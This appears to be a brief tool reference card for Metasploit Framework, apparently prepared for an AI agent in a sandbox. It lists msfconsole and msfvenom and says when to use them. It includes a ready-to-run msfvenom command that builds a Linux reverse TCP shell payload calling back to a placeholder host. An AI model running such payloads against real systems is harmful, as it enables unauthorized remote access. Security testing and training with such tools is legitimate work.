# Metasploit Framework

**Category**: Exploit frameworks, payloads, deserialization, and local privesc enumeration

**Purpose**: Modular exploit, payload, scanner, and post-exploitation framework.

**When to use**: Use after confirming a vulnerable service, exploit module, deserialization sink, or local shell.

## Commands
- `msfconsole`
- `msfvenom`

## First Commands
- `msfconsole -q -x 'search type:exploit PRODUCT; exit'`
- `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf`

## Notes
Use non-interactive -x scripts because sandbox commands are non-interactive.

## Captured Help
No live help output was captured. Start with the commands above, or run the tool with `-h`/`--help` in the sandbox.
